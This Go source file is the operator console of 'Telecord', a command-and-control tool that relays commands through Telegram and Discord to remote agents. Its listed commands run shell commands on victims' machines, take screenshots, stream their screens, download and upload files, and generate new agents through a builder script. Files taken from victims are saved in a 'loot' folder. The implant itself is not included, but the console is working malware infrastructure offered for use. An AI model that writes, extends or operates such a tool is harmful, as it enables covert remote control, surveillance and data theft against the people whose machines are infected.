package main

import (
    "bufio"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "github.com/go-telegram-bot-api/telegram-bot-api"
    "github.com/fatih/color"
	"strings"
	"encoding/json"
	"bytes"
	"io"
	"path/filepath"
	"os/exec"
    "runtime"
	"io/ioutil"
	"time"
	"flag"
	"os/signal"
	"syscall"
	"errors"
	"math"
	"gopkg.in/yaml.v2"
	
)

type Config struct {
	DISCORD_BOT_TOKEN string `yaml:"DISCORD_BOT_TOKEN"`
    BOT_API_KEY2 string `yaml:"BOT_API_KEY2"`
    CID          int64  `yaml:"CID"`
    WebhookURL   string `yaml:"webhookURL"`
	BOT_API_KEY  string `yaml:"BOT_API_KEY"`
    ANOTHER_DISCORD_CHANNEL_T_ID string `yaml:"ANOTHER_DISCORD_CHANNEL_T_ID"`
}
type WebhookBody struct {
    Content string `json:"content"`
}
func sendToDiscordWebhook(agentID string) {
   
    body := &WebhookBody{
        Content: agentID,
    }

    bodyBytes, _ := json.Marshal(body)
    http.Post(config.WebhookURL, "application/json", bytes.NewBuffer(bodyBytes))
}
func downloadImage(url, directory string) (string, error) {
    // Create the screenshots directory if it doesn't exist
    if err := os.MkdirAll(directory, os.ModePerm); err != nil {
        return "", err
    }

    // Fetch the image from the URL
    response, err := http.Get(url)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()

    // Create the file in screenshots directory
    fileName := filepath.Base(url)
    filePath := filepath.Join(directory, fileName)
    file, err := os.Create(filePath)
    if err != nil {
        return "", err
    }
    defer file.Close()

    // Copy the image data to the file
    _, err = io.Copy(file, response.Body)
    if err != nil {
        return "", err
    }

    return filePath, nil
}

func displayImageWithURL(url string) error {
    // Download the image to screenshots directory
    imagePath, err := downloadImage(url, "./screenshots")
    if err != nil {
        return err
    }
    fmt.Printf("Image downloaded: %s", imagePath)

    // Open the downloaded image
    if err := openImage(imagePath); err != nil {
        return err
    }

    return nil
}

func openImage(imagePath string) error {
    var cmd *exec.Cmd

    // Determine the OS and set the appropriate command
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd", "/c", "start", imagePath)
    case "darwin":
        cmd = exec.Command("open", imagePath)
    case "linux":
        cmd = exec.Command("xdg-open", imagePath)
    default:
        return fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
    }

    // Run the command
    if err := cmd.Run(); err != nil {
        return err
    }

    return nil
}
func displayScreenshare(url string) error {
	// Download the image from the URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("error downloading image: %v", err)
	}
	defer resp.Body.Close()

	// Read the image data
	imageData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading image data: %v", err)
	}

	// Save the image as screenshot.jpg
	err = ioutil.WriteFile("screenshots/screenshot.jpg", imageData, 0644)
	if err != nil {
		return fmt.Errorf("error saving image: %v", err)
	}
	
	
	

	
	return nil
}
func downloadFile(fileURL, fileName string) error {
    // Create the file
    out, err := os.Create(fileName)
    if err != nil {
        return err
    }
    defer out.Close()

    // Get the data
    resp, err := http.Get(fileURL)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    // Write the body to file
    _, err = io.Copy(out, resp.Body)
    return err
}
func getFileIDFromMessage(bot *tgbotapi.BotAPI, chatID int64, fileName string) (string, error) {
	// Fetch recent messages from the channel
	log.Println("Getting file ID for file:", fileName)
	updates, err := bot.GetUpdates(tgbotapi.UpdateConfig{Offset: math.MaxInt32, Limit: 100})
	if err != nil {
		return "", err
	}

	// Find the message that contains the file
	for i := len(updates) - 1; i >= 0; i-- {
		update := updates[i]
		if update.Message != nil && update.Message.Document != nil {
			log.Println("Found a document:", update.Message.Document.FileName)
			if update.Message.Document.FileName == fileName {
				// Get the file URL
				fileURL, err := bot.GetFileDirectURL(update.Message.Document.FileID)
				if err != nil {
					log.Println("Error getting file URL:", err)
					return "", err
				}

				return fileURL, nil
			}
		}
	}

	log.Println("File not found:", fileName)
	return "", errors.New("file not found")
}


func uploadFile(bot *tgbotapi.BotAPI, chatID int64, filePath string) error {
    // Create a new document upload
    msg := tgbotapi.NewDocumentUpload(chatID, filePath)

    // Send the document
    _, err := bot.Send(msg)
    return err
}
var theme string
var config Config
func main() {
	_, err := os.Stat("config.yaml")
    if os.IsNotExist(err) {
        // Prompt the user for the values
		fmt.Print("Enter BOT_API_KEY: ")
        fmt.Scanln(&config.BOT_API_KEY)
        fmt.Print("Enter BOT_API_KEY2: ")
        fmt.Scanln(&config.BOT_API_KEY2)

        fmt.Print("Enter CID: ")
        fmt.Scanln(&config.CID)
		fmt.Print("Enter DISCORD_BOT_TOKEN: ")
		fmt.Scanln(&config.DISCORD_BOT_TOKEN)
        fmt.Print("Enter webhookURL: ")
        fmt.Scanln(&config.WebhookURL)
		fmt.Print("Enter DISCORD_CHANNEL_ID: ")
		fmt.Scanln(&config.ANOTHER_DISCORD_CHANNEL_T_ID)

        // Store the values in config.yaml
        data, err := yaml.Marshal(&config)
        if err != nil {
            panic(err)
        }
        err = ioutil.WriteFile("config.yaml", data, 0644)
        if err != nil {
            panic(err)
        }
    } else {
        // Read the values from config.yaml
        data, err := ioutil.ReadFile("config.yaml")
        if err != nil {
            panic(err)
        }
		err = yaml.Unmarshal(data, &config)
        if err != nil {
            panic(err)
        }
    }
	var BOT_API_KEY2  =config.BOT_API_KEY2
    var CID =config.CID
	

	flag.StringVar(&theme, "theme", "green", "set the theme color (green, red, yellow, blue, magenta, cyan, white, hiYellow, hiBlue, teal)")	
	flag.Parse()
	
	var colorFunc func(a ...interface{}) string
	var yy func(format string, a ...interface{})
	switch theme {
	case "red":
		colorFunc = color.New(color.FgRed).SprintFunc()
		yy = color.New(color.FgRed).PrintfFunc()
	case "green":
		colorFunc = color.New(color.FgGreen).SprintFunc()
		yy = color.New(color.FgGreen).PrintfFunc()
	case "yellow":
		colorFunc = color.New(color.FgYellow).SprintFunc()
		yy = color.New(color.FgYellow).PrintfFunc()
	case "blue":
		colorFunc = color.New(color.FgBlue).SprintFunc()
		yy = color.New(color.FgBlue).PrintfFunc()
	case "magenta": // for purple
		colorFunc = color.New(color.FgMagenta).SprintFunc()
		yy = color.New(color.FgMagenta).PrintfFunc()
	case "cyan": // for teal
		colorFunc = color.New(color.FgCyan).SprintFunc()
		yy = color.New(color.FgCyan).PrintfFunc()
	case "white": // for grey
		colorFunc = color.New(color.FgWhite).SprintFunc()
		yy = color.New(color.FgWhite).PrintfFunc()
	case "hiyellow": // for gold
		colorFunc = color.New(color.FgHiYellow).SprintFunc()
		yy = color.New(color.FgHiYellow).PrintfFunc()
	case "hiblue": // for sapphire
		colorFunc = color.New(color.FgHiBlue).SprintFunc()
		yy = color.New(color.FgHiBlue).PrintfFunc()
	case "teal":
		colorFunc = func(a ...interface{}) string {
			return fmt.Sprintf("\033[38;5;42m%s\033[0m", fmt.Sprint(a...))
		}
		yy = func(format string, a ...interface{}) {
			fmt.Printf("\033[38;5;42m"+format+"\033[0m", a...)
		}
	default:
		colorFunc = color.New(color.FgGreen).SprintFunc()
		yy = color.New(color.FgGreen).PrintfFunc()
	}
	
	asciiArt := `
	$$$$$$$$\        $$\                                               $$\ 
	\__$$  __|       $$ |                                              $$ |
	   $$ | $$$$$$\  $$ | $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$$ |
	   $$ |$$  __$$\ $$ |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$  __$$ |
	   $$ |$$$$$$$$ |$$ |$$$$$$$$ |$$ /      $$ /  $$ |$$ |  \__|$$ /  $$ |
	   $$ |$$   ____|$$ |$$   ____|$$ |      $$ |  $$ |$$ |      $$ |  $$ |
	   $$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |      \$$$$$$$ |
	   \__| \_______|\__| \_______| \_______| \______/ \__|       \_______|
	
		Author: github@Elmerikh


`
	
	yy("%s", asciiArt)
		
    botToken := BOT_API_KEY2
    bot, err := tgbotapi.NewBotAPI(botToken)
    if err != nil {
        log.Panic(err)
    }

    // Disable debug mode
    bot.Debug = false

    channelID :=  CID// replace with your actual channel ID

    u := tgbotapi.NewUpdate(0)
    u.Timeout = 60

    updates, err := bot.GetUpdatesChan(u)
    if err != nil {
        log.Panic(err)
    }

    green := color.New(color.FgGreen).SprintFunc()
    cyan := color.New(color.FgCyan).SprintFunc()
    yellow := color.New(color.FgYellow).SprintFunc()

	

	go func() {
		for update := range updates {
			if update.ChannelPost != nil && update.ChannelPost.Chat.ID == channelID {
				// Print the message text with colors and a green prompt
				fmt.Printf("\n%s [%s] %s \n", yellow(">"), cyan(update.ChannelPost.Chat.Title), green(update.ChannelPost.Text))
				
				// Check if the command is "/screenshare" and it has not been received before
				if strings.ToLower(update.ChannelPost.Text) == "/screenshare"  {
					fmt.Println(green("Screen share command received."))
					
					
					
				}
				
				if update.ChannelPost.Photo != nil {
					photo := *update.ChannelPost.Photo
					fileID := photo[len(photo)-1].FileID
					fmt.Printf("\n%s Photo: %s", green(">"), fileID)
					
					// Get the file
					file, err := bot.GetFileDirectURL(fileID)
					if err != nil {
						log.Println("Error getting file URL:", err)
						continue
					}
					
					fmt.Printf("\n%s Photo URL: %s \n", green(">"), file)
					
						displayScreenshare(file)
						
					
				}
			if update.ChannelPost.Document != nil {
				document := *update.ChannelPost.Document
				fileID := document.FileID
				fmt.Printf("\n%s Document: %s", green(">"), fileID)
				
				// Get the file
				fileURL, err := bot.GetFileDirectURL(fileID)
				if err != nil {
					log.Println("Error getting file URL:", err)
					continue
				}
				
				fmt.Printf("\n%s Document URL: %s \n", green(">"), fileURL)

				// Create the .loot directory if it doesn't exist
				os.MkdirAll("loot", os.ModePerm)

				// Download the file
				response, err := http.Get(fileURL)
				if err != nil {
					log.Println("Error downloading file:", err)
					continue
				}
				defer response.Body.Close()

				// Create the file in the .loot directory
				outFile, err := os.Create("loot/" + document.FileName)
				if err != nil {
					log.Println("Error creating file:", err)
					continue
				}
				defer outFile.Close()

				// Write the contents of the downloaded file to the new file
				_, err = io.Copy(outFile, response.Body)
				if err != nil {
					log.Println("Error writing to file:", err)
					continue
				}
			}
				
				

			}
			
		}
	}()

	reader := bufio.NewReader(os.Stdin)
	sigChan := make(chan os.Signal, 1)
    // Create a channel to signal a stop share command
    stopShareChan := make(chan bool, 1)

    // Notify the channel when an interrupt signal is received
    signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	ctrlCCounter := 0

	// Timer for consecutive Ctrl+C presses
	var ctrlCTimer *time.Timer
	go func() {
		for {
			// Wait for the signal
			<-sigChan
			// When Ctrl+C is pressed, increment the counter
			ctrlCCounter++
			if ctrlCCounter == 1 {
				// Start the timer when Ctrl+C is pressed for the first time
				ctrlCTimer = time.AfterFunc(500*time.Millisecond, func() {
					ctrlCCounter = 0
				})
			} else if ctrlCCounter == 2 {
				// If Ctrl+C was pressed twice consecutively, signal a stop share command
				fmt.Println("Ctrl+C pressed twice consecutively.")
				stopShareChan <- true
			}
		}
	}()
	nextCommand := ""

	for {
		time.Sleep(600 * time.Millisecond)
		
		select {
		case <-stopShareChan:
			// Handle the stop share command
			fmt.Println("Stop share command issued.")
			nextCommand = "/stopshare"
			ctrlCCounter = 0 // Reset the counter
			ctrlCTimer.Stop() // Stop the timer
			continue
		default:
			// If no stop share command was issued, proceed as normal
		}
		
		fmt.Print(colorFunc("    {~Telecord($)> ")) 
		text := nextCommand
		if text == "" {
			text, _ = reader.ReadString('\n')
		}
		nextCommand = ""
		var newtext string
		// Send the command to the same channel via the Telegram HTTP API
		botToken := BOT_API_KEY2 // replace with the token of your bot
		channelID :=  CID // replace with the ID of the channel
		newtext = strings.TrimSpace(text)
		text = url.QueryEscape(text)
		if newtext == "" {
			fmt.Println("\033[31mPlease enter a command.\033[0m")
			continue
		}
		if strings.HasPrefix(newtext, "!interact") {
			
			// Send the command to the same channel via the Telegram HTTP API
			agentID :=newtext
			
			if err != nil {
				fmt.Println("error reading .id file,", err)
				return
			}
			
			sendToDiscordWebhook(agentID)
			
	}
	if strings.HasPrefix(newtext, "!kill") {
			
		// Send the command to the same channel via the Telegram HTTP API
		agentID :=newtext
		fmt.Println("\n")
		fmt.Println("\033[31m💀 Killed Agent .\033[0m")
		fmt.Println("\n")
		if err != nil {
			fmt.Println("error reading .id file,", err)
			return
		}
		
		sendToDiscordWebhook(agentID)
		
}

	if strings.HasPrefix(newtext, "!list") {
			
		// Send the command to the same channel via the Telegram HTTP API
		agentID :=newtext

		if err != nil {
			fmt.Println("error reading .id file,", err)
			return
		}
		
		sendToDiscordWebhook(agentID)
		
		color.New(color.FgBlue).Println("\nlist of sessions :")

		}else {
		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%d&text=%s", botToken, channelID, text)
		resp, err := http.Get(apiURL)
		if err != nil {
			log.Println("Error sending command:", err)
			return
		}
	
		if resp.StatusCode != http.StatusOK {
			log.Println("Error sending command, status code:", resp.StatusCode)
		}
	
		resp.Body.Close()
	}
	if strings.TrimSpace(newtext) == "/screenshare" {
		fmt.Println("\n")
		fmt.Println("\033[34mScreen sharing command sent.\033[0m\n")
		fmt.Println("\n")
		fmt.Println("\033[34mPRESS CTRL+C TWICE to STOP Screensharing.\033[0m")
		time.Sleep(3000 * time.Millisecond)
					openImage("./screenshots/screenshare.html")
		
	
	}
	if strings.TrimSpace(newtext) == "/screenshot" {
		fmt.Println("\n")
		fmt.Println("\033[34mScreenshot command sent.\033[0m")
		time.Sleep(1600 * time.Millisecond)
					openImage("./screenshots/screenshare.html")
		
	
	}
	if strings.TrimSpace(newtext) == "/session" {
		fmt.Println("\n")
		fmt.Println("\033[34mCurrent Active session:\033[0m")
		fmt.Println("\n")
		
					
		
	
	}else if strings.HasPrefix(newtext, "/download") {
		time.Sleep(1600 * time.Millisecond)
		fmt.Println("\033[34mFile downloaded to ./loot directory\033[0m")
	} else if strings.HasPrefix(newtext, "/upload") {
		filePath := strings.TrimSpace(strings.TrimPrefix(newtext, "/upload"))
		err := uploadFile(bot, CID, filePath)
		if err != nil {
			log.Println("Error uploading file:", err)
		}
	}
		
	if strings.TrimSpace(newtext) == "help" {
		color.New(color.FgHiGreen).Println("\n    List of commands:\n")
		color.New(color.FgHiGreen).Println("		!Kitty = spawn a cat\n")
		color.New(color.FgHiGreen).Println("		!list = list sessions\n")
		color.New(color.FgHiGreen).Println("		!interact <id> = interact with a session\n")
		color.New(color.FgHiGreen).Println("		/session = display current session you are interacting with \n")
		color.New(color.FgHiGreen).Println("   		/shell <command>: send shell command\n")
		color.New(color.FgHiGreen).Println("		/screenshot = take a screenshot of desktop\n")
		color.New(color.FgHiGreen).Println("		/screenshare = screenshare the desktop\n")
		color.New(color.FgHiGreen).Println("		/download <file> = download file from session\n")
		color.New(color.FgHiGreen).Println("		/upload <file> = upload file to session\n")
		color.New(color.FgHiGreen).Println("		/stop = make agent go to sleep (necessary to jump to another session")
		color.New(color.FgHiGreen).Println("			by default all agent in session are asleep)\n")
		color.New(color.FgHiGreen).Println("		!kill <id> = kill agent 💀\n")
		color.New(color.FgHiGreen).Println("		!generate <plateform> = generate Telecord agent \n")
		color.New(color.FgHiGreen).Println("		exit = exit Telecord\n")
		continue
	}
	if strings.HasPrefix(newtext, "!generate ") {
		platform := strings.TrimSpace(strings.TrimPrefix(newtext, "!generate "))
		fmt.Println("\033[38;5;208m\ngenerating agent for ", platform, "platform ...\n\033[0m")
		var cmd *exec.Cmd
		if runtime.GOOS == "linux" {
			cmd = exec.Command("python3", "builder.py", "-pl",platform)
		} else {
			cmd = exec.Command("python", "builder.py", "-pl", platform)
		}
		
		err := cmd.Run()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("\033[38;5;208m\nAgent built !!!,check ./Output\n\033[0m")
		continue
	}
	if strings.TrimSpace(newtext) == "!kitty" {
		color.New(color.FgHiGreen).Println(`
  /\_/\  (
 ( ^.^ ) _)
   \"/  (        meow meow !   
 ( | | )		 
(__d b__)    	     	  	       
	`)
	
		continue
	}
	if strings.TrimSpace(newtext) == "exit" {
		color.New(color.FgHiGreen).Println(`
		__.-._
		'-._"7'
		 /'.-c
		 |  /T
	     	 |_/LI
			`)
		exitText := "	\n	May the force be with you\n"
		for _, c := range exitText {
			color.New(color.FgCyan).Printf("%c", c)
			time.Sleep(50 * time.Millisecond) // delay between each character
		}
		fmt.Println()
		time.Sleep(50 * time.Millisecond)
		break
	}

	
        
        
}}